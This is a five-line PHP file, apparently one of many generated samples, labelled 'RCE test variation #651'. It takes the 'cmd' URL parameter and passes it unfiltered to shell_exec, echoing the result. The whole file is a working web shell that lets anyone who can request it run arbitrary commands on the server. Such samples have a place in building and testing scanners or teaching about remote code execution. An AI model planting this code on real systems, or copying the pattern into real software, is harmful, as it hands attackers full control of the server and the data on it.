<?php
// RCE test variation #651
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>